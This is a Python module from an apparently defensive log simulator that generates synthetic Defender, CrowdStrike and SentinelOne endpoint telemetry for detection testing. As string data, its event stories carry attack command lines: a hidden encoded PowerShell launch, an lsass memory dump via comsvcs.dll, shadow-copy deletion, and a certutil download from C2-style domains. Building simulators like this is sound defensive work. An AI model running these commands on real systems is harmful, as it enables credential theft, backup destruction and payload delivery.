"""EDR agent telemetry: one generator, three vendor formatters.

Emits the five event types XSIAM endpoint analytics and the case view read
(process start, network connection, DNS query, file create, detection) in the
native JSON of Microsoft Defender for Endpoint, CrowdStrike Falcon and
SentinelOne. Each enabled agent renders the same story with the same user,
host and timestamp, so a case groups across agents instead of splitting.

Transport is the HTTP collector. The vendor and product headers are set per
event so each agent lands in its own dataset and content pack:

    msft / defender                 -> msft_defender_raw
    crowdstrike / fdr               -> crowdstrike_fdr_raw
    sentinelone / deep_visibility   -> sentinelone_deep_visibility_raw

Toggles live in edr_agents_config (defender_enabled, crowdstrike_enabled,
sentinelone_enabled). An env var of the same name in upper case overrides the
config value, so a collector can be turned off without editing config.json.
Vendor and product strings are also overridable per agent, for tenants whose
content pack expects a different dataset name.
"""
import hashlib
import json
import os
import random
import time
import uuid

NAME = "EDR Agents"
DESCRIPTION = ("Endpoint agent telemetry for Microsoft Defender, CrowdStrike Falcon "
               "and SentinelOne, from one generator with a formatter per agent.")
CONFIG_KEY = "edr_agents_config"
NATIVE_TRANSPORT = "http"
# Defaults; generate_log overrides these per event so each agent hits its dataset.
XSIAM_VENDOR = "Microsoft"
XSIAM_PRODUCT = "Defender Endpoint"

_AGENTS = ("defender", "crowdstrike", "sentinelone")

# These produce the official raw EDR datasets that XSIAM models into xdr_data:
#   msft_defender_raw, crowdstrike_fdr_raw, sentinelone_deep_visibility_raw
# HTTP collectors reject spaces in Product, so the values are single tokens.
_AGENT_DEFAULTS = {
    "defender": ("msft", "defender"),
    "crowdstrike": ("crowdstrike", "fdr"),
    "sentinelone": ("sentinelone", "deep_visibility"),
}

# External C2-style addresses. Kept off the well-known ranges so they do not
# collide with the rest of the simulator's external pool.
_C2_IPS = ["185.220.101.47", "45.142.212.61", "91.219.236.220", "193.142.59.88",
           "77.91.84.130", "151.236.19.44", "89.38.98.71", "103.152.220.14"]
_C2_DOMAINS = ["update-service.net", "cdn-sync.io", "metrics-collector.xyz",
               "edge-config.top", "static-assets.cyou"]

_BENIGN_PROCS = [
    ("explorer.exe", "C:\\Windows\\explorer.exe", "C:\\Windows\\explorer.exe"),
    ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
     '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer'),
    ("msedge.exe", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
     '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=gpu-process'),
    ("outlook.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
     '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"'),
    ("winword.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
     '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n'),
    ("excel.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
     '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"'),
    ("teams.exe", "C:\\Users\\Public\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
     "Teams.exe"),
    ("onedrive.exe", "C:\\Users\\Public\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
     "OneDrive.exe /background"),
    ("svchost.exe", "C:\\Windows\\System32\\svchost.exe",
     "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"),
    ("SearchIndexer.exe", "C:\\Windows\\System32\\SearchIndexer.exe",
     "SearchIndexer.exe /Embedding"),
    ("MsMpEng.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe",
     "MsMpEng.exe"),
    ("RuntimeBroker.exe", "C:\\Windows\\System32\\RuntimeBroker.exe",
     "RuntimeBroker.exe -Embedding"),
    ("dllhost.exe", "C:\\Windows\\System32\\dllhost.exe",
     "C:\\Windows\\System32\\dllhost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}"),
    ("taskhostw.exe", "C:\\Windows\\System32\\taskhostw.exe",
     "taskhostw.exe"),
    ("spoolsv.exe", "C:\\Windows\\System32\\spoolsv.exe",
     "C:\\Windows\\System32\\spoolsv.exe"),
]

_BENIGN_NET = [
    ("142.250.190.14", 443),
    ("13.107.42.14", 443),
    ("52.113.194.132", 443),
    ("20.190.160.15", 443),
    ("104.18.32.47", 443),
    ("151.101.1.69", 443),
]



# UI overrides. None means "use env, then config". Set by the dashboard so a
# running module picks the change up on its next event, without a restart.
_TOGGLES = {a: None for a in _AGENTS}


def set_agents(enabled):
    """Apply dashboard toggles. Keys are agent names, values are bools."""
    for agent, value in (enabled or {}).items():
        if agent in _TOGGLES:
            _TOGGLES[agent] = bool(value)


def agent_state(config=None):
    return {a: _enabled(config, a) for a in _AGENTS}


def _enabled(config, agent):
    if _TOGGLES.get(agent) is not None:
        return _TOGGLES[agent]
    cfg = (config or {}).get(CONFIG_KEY, {})
    env = os.getenv(f"EDR_{agent.upper()}_ENABLED")
    if env is not None:
        return env.strip().lower() in ("1", "true", "yes", "on")
    return bool(cfg.get(f"{agent}_enabled", True))


def _vendor_product(config, agent):
    cfg = (config or {}).get(CONFIG_KEY, {})
    vendor = cfg.get(f"{agent}_vendor") or _AGENT_DEFAULTS[agent][0]
    product = cfg.get(f"{agent}_product") or _AGENT_DEFAULTS[agent][1]
    return vendor, product


def _identity(config):
    try:
        from modules.session_utils import build_session_context, get_random_user
        ctx = build_session_context(config or {})
        u = get_random_user(ctx)
        if u:
            return (u.get("username") or "user",
                    u.get("hostname") or "PC-01",
                    u.get("ip") or "10.1.1.20",
                    u.get("email") or "user@examplecorp.com")
    except Exception:
        pass
    try:
        from modules.session_utils import get_random_host
        host, ip = get_random_host(config)
        return "user", host, ip, "user@examplecorp.com"
    except Exception:
        return "user", "PC-01", "10.1.1.20", "user@examplecorp.com"


def _sha(seed):
    return hashlib.sha256(seed.encode()).hexdigest()


def _now():
    return time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())


def _story(kind, ident):
    """A small ordered list of shared events for one user and host."""
    user, host, ip, email = ident
    ts = _now()
    sid = uuid.uuid4().hex[:12]
    c2_ip = random.choice(_C2_IPS)
    c2_dom = random.choice(_C2_DOMAINS)
    parent = ("winword.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE")

    if kind == "encoded_powershell":
        cmd = ("powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand "
               "JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA==")
        return [
            _proc(user, host, ip, parent[0], parent[1], parent[0], "explorer.exe", ts, sid),
            _proc(user, host, ip, "powershell.exe",
                  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                  cmd, parent[0], ts, sid),
            _net(user, host, ip, "powershell.exe", c2_ip, 443, ts, sid),
            _detect(user, host, ip, "powershell.exe", "Encoded PowerShell execution", "high", ts, sid),
        ]
    if kind == "lsass_access":
        return [
            _proc(user, host, ip, "rundll32.exe", "C:\\Windows\\System32\\rundll32.exe",
                  "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump "
                  f"{random.randint(400,900)} C:\\Windows\\Temp\\lsass.dmp full",
                  "cmd.exe", ts, sid),
            _file(user, host, ip, "C:\\Windows\\Temp\\lsass.dmp", "created", ts, sid),
            _detect(user, host, ip, "rundll32.exe", "Credential dumping via lsass", "critical", ts, sid),
        ]
    if kind == "c2_beacon":
        return [
            _proc(user, host, ip, "svchost.exe", "C:\\Windows\\System32\\svchost.exe",
                  "C:\\Windows\\System32\\svchost.exe -k netsvcs", "services.exe", ts, sid),
            _dns(user, host, ip, c2_dom, c2_ip, ts, sid),
            _net(user, host, ip, "svchost.exe", c2_ip, 443, ts, sid),
            _net(user, host, ip, "svchost.exe", c2_ip, 443, ts, sid),
            _detect(user, host, ip, "svchost.exe", "Recurring callback to rare domain", "high", ts, sid),
        ]
    if kind == "shadow_copy":
        return [
            _proc(user, host, ip, "vssadmin.exe", "C:\\Windows\\System32\\vssadmin.exe",
                  "vssadmin.exe delete shadows /all /quiet", "cmd.exe", ts, sid),
            _proc(user, host, ip, "wmic.exe", "C:\\Windows\\System32\\wbem\\WMIC.exe",
                  "wmic shadowcopy delete", "cmd.exe", ts, sid),
            _detect(user, host, ip, "vssadmin.exe", "Shadow copy deletion", "critical", ts, sid),
        ]
    if kind == "certutil_download":
        return [
            _proc(user, host, ip, "certutil.exe", "C:\\Windows\\System32\\certutil.exe",
                  f"certutil.exe -urlcache -split -f http://{c2_dom}/update.cab "
                  "C:\\Users\\Public\\update.cab",
                  "cmd.exe", ts, sid),
            _net(user, host, ip, "certutil.exe", c2_ip, 80, ts, sid),
            _file(user, host, ip, "C:\\Users\\Public\\update.cab", "created", ts, sid),
            _detect(user, host, ip, "certutil.exe", "Lolbin download via certutil", "high", ts, sid),
        ]
    # benign noise
    name, path, cmd = random.choice(_BENIGN_PROCS)
    remote, port = random.choice(_BENIGN_NET)
    events = [
        _proc(user, host, ip, name, path, cmd, "explorer.exe", ts, sid),
        _net(user, host, ip, name, remote, port, ts, sid),
    ]
    if random.random() < 0.4:
        events.append(_dns(user, host, ip, random.choice([
            "www.microsoft.com", "login.microsoftonline.com", "outlook.office.com",
            "teams.microsoft.com", "www.google.com", "cdn.office.net",
        ]), "142.250.190.14", ts, sid))
    if random.random() < 0.25:
        events.append(_file(user, host, ip, random.choice([
            "C:\\Users\\Public\\Documents\\report.docx",
            "C:\\Users\\Public\\Downloads\\setup.exe",
            "C:\\Windows\\Temp\\~DF.tmp",
        ]), random.choice(["created", "modified", "accessed"]), ts, sid))
    return events


def _proc(user, host, ip, name, path, cmd, parent, ts, sid):
    return {"kind": "process", "user": user, "host": host, "ip": ip, "name": name,
            "path": path, "cmd": cmd, "parent": parent, "sha256": _sha(path),
            "ts": ts, "sid": sid}


def _net(user, host, ip, name, remote, port, ts, sid):
    return {"kind": "network", "user": user, "host": host, "ip": ip, "name": name,
            "remote": remote, "port": port, "ts": ts, "sid": sid}


def _dns(user, host, ip, domain, answer, ts, sid):
    return {"kind": "dns", "user": user, "host": host, "ip": ip, "domain": domain,
            "answer": answer, "ts": ts, "sid": sid}


def _file(user, host, ip, path, action, ts, sid):
    return {"kind": "file", "user": user, "host": host, "ip": ip, "path": path,
            "name": path.rsplit("\\", 1)[-1], "action": action, "sha256": _sha(path),
            "ts": ts, "sid": sid}


def _detect(user, host, ip, name, title, severity, ts, sid):
    return {"kind": "detection", "user": user, "host": host, "ip": ip, "name": name,
            "title": title, "severity": severity, "ts": ts, "sid": sid}


# ── formatters ──────────────────────────────────────────────────────────────

def _defender(e):
    """Microsoft Defender for Endpoint Advanced Hunting shape.

    Fields follow the DeviceProcessEvents / DeviceNetworkEvents / DeviceFileEvents
    tables so the MDE content pack and a simple modeling rule can map them.
    """
    base = {
        "Timestamp": e["ts"],
        "DeviceName": e["host"],
        "DeviceId": e["sid"],
        "AccountName": e["user"],
        "AccountDomain": "CONTOSO",
        "AccountSid": "S-1-5-21-1000-1000-1000-1105",
        "LocalIP": e["ip"],
        "ReportId": e["sid"],
        "InitiatingProcessAccountName": e["user"],
        "InitiatingProcessFileName": e.get("parent") or e.get("name"),
    }
    if e["kind"] == "process":
        base.update({
            "ActionType": "ProcessCreated",
            "FileName": e["name"],
            "FolderPath": e["path"],
            "ProcessCommandLine": e["cmd"],
            "ProcessId": 4000,
            "InitiatingProcessFileName": e["parent"],
            "InitiatingProcessCommandLine": e["parent"],
            "InitiatingProcessFolderPath": "C:\\Windows\\System32",
            "SHA256": e["sha256"],
            "SHA1": e["sha256"][:40],
            "MD5": e["sha256"][:32],
        })
    elif e["kind"] == "network":
        base.update({
            "ActionType": "ConnectionSuccess",
            "InitiatingProcessFileName": e["name"],
            "RemoteIP": e["remote"],
            "RemotePort": e["port"],
            "LocalPort": 50000,
            "Protocol": "Tcp",
        })
    elif e["kind"] == "dns":
        base.update({
            "ActionType": "DnsQueryResponse",
            "QueryType": "A",
            "QueryName": e["domain"],
            "RemoteIP": e["answer"],
            "InitiatingProcessFileName": e.get("name"),
        })
    elif e["kind"] == "file":
        base.update({
            "ActionType": "FileCreated",
            "FileName": e["name"],
            "FolderPath": e["path"],
            "SHA256": e["sha256"],
            "InitiatingProcessFileName": e.get("parent") or e.get("name"),
        })
    else:
        base.update({
            "ActionType": "AlertTriggered",
            "Title": e["title"],
            "Severity": e["severity"],
            "FileName": e["name"],
            "Category": "Execution",
            "AlertId": e["sid"],
        })
    return base


def _crowdstrike(e):
    names = {"process": "ProcessRollup2", "network": "NetworkConnectIP4",
             "dns": "DnsRequest", "file": "FileOpenInfo", "detection": "DetectionSummaryEvent"}
    base = {"event_simpleName": names[e["kind"]], "ComputerName": e["host"],
            "UserName": e["user"], "LocalAddressIP4": e["ip"], "timestamp": e["ts"],
            "aid": e["sid"]}
    if e["kind"] == "process":
        base.update({"ImageFileName": e["path"], "CommandLine": e["cmd"],
                     "ParentBaseFileName": e["parent"], "SHA256HashData": e["sha256"]})
    elif e["kind"] == "network":
        base.update({"ImageFileName": e["name"], "RemoteAddressIP4": e["remote"],
                     "RemotePort": e["port"]})
    elif e["kind"] == "dns":
        base.update({"DomainName": e["domain"], "RemoteAddressIP4": e["answer"]})
    elif e["kind"] == "file":
        base.update({"FileName": e["path"], "SHA256HashData": e["sha256"]})
    else:
        base.update({"DetectName": e["title"], "SeverityName": e["severity"],
                     "FileName": e["name"]})
    return base


def _sentinelone(e):
    types = {"process": "Process Creation", "network": "IP Connect",
             "dns": "DNS Resolved", "file": "File Creation", "detection": "Threat"}
    base = {"eventType": types[e["kind"]], "agentComputerName": e["host"],
            "srcUserName": e["user"], "srcIp": e["ip"], "createdAt": e["ts"],
            "agentUuid": e["sid"]}
    if e["kind"] == "process":
        base.update({"tgtProcName": e["name"], "tgtFilePath": e["path"],
                     "tgtProcCmdLine": e["cmd"], "srcProcName": e["parent"],
                     "sha256": e["sha256"]})
    elif e["kind"] == "network":
        base.update({"srcProcName": e["name"], "dstIp": e["remote"], "dstPort": e["port"]})
    elif e["kind"] == "dns":
        base.update({"dnsRequest": e["domain"], "dstIp": e["answer"]})
    elif e["kind"] == "file":
        base.update({"tgtFilePath": e["path"], "sha256": e["sha256"]})
    else:
        base.update({"threatName": e["title"], "confidenceLevel": e["severity"],
                     "srcProcName": e["name"]})
    return base


_FORMATTERS = {"defender": _defender, "crowdstrike": _crowdstrike, "sentinelone": _sentinelone}

_GENERATORS = ["encoded_powershell", "lsass_access", "c2_beacon", "shadow_copy", "certutil_download"]

ANALYTIC_ALERTS = {
    "encoded_powershell": "EDR — Encoded PowerShell Spawned From Office",
    "lsass_access": "EDR — Credential Dumping via LSASS",
    "c2_beacon": "EDR — Recurring Callback to Rare Domain",
    "shadow_copy": "EDR — Shadow Copy Deletion",
    "certutil_download": "EDR — Certutil Download of Remote Payload",
}


def get_threat_names():
    return list(_GENERATORS)


def route_event(message):
    """(vendor, product, collector_id) so the batch splits onto one collector per agent."""
    try:
        obj = json.loads(message) if isinstance(message, str) else message
    except (json.JSONDecodeError, TypeError):
        return None
    vp = obj.get("_logsim_route") if isinstance(obj, dict) else None
    return tuple(vp) if vp else None


def generate_log(config=None, scenario=None, scenario_event=None,
                 threat_level="Realistic", benign_only=False, context=None):
    enabled = [a for a in _AGENTS if _enabled(config, a)]
    if not enabled:
        return None
    ident = _identity(config)
    if benign_only or threat_level == "Benign Traffic Only":
        kind = "benign"
    elif scenario_event in _GENERATORS:
        kind = scenario_event
    else:
        attack_chance = {"Realistic": 0.08, "Elevated": 0.20, "High": 0.40}.get(threat_level, 0.08)
        kind = random.choice(_GENERATORS) if random.random() < attack_chance else "benign"
    events = _story(kind, ident)
    rendered = []
    for agent in enabled:
        fmt = _FORMATTERS[agent]
        vp = list(_vendor_product(config, agent))
        collector = ((config or {}).get(CONFIG_KEY, {}) or {}).get(f"{agent}_collector") or f"{agent}_collector"
        for e in events:
            obj = fmt(e)
            obj["_logsim_route"] = vp + [collector]
            rendered.append(json.dumps(obj))
    # route_event strips the marker; set the module default to the first agent
    # so a collector that ignores the hook still has a sensible header.
    global XSIAM_VENDOR, XSIAM_PRODUCT
    XSIAM_VENDOR, XSIAM_PRODUCT = _vendor_product(config, enabled[0])
    return rendered, kind
